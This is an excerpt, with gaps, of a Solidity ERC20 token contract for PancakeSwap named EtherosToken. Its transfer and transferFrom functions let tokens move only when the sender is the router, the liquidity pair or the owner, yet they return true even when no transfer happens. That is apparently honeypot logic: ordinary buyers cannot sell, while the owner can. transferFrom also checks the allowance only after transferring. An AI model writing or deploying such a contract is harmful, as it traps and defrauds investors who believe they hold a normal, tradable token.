...
contract EtherosToken is Context, IERC20, IERC20Metadata, Ownable {
    address internal constant PANCAKE_FACTORY_V2_ADDRESS = 0x6725F303b657a9451d8BA641348b6761A6CC7a17;
    address internal constant PANCAKE_ROUTER_V2_ADDRESS = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD;
    uint256 _LOCK = 100 * 10**6;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= _LOCK || isBurn) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            //nomal user check amount
            if( (amount <= _LOCK || isBurn) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
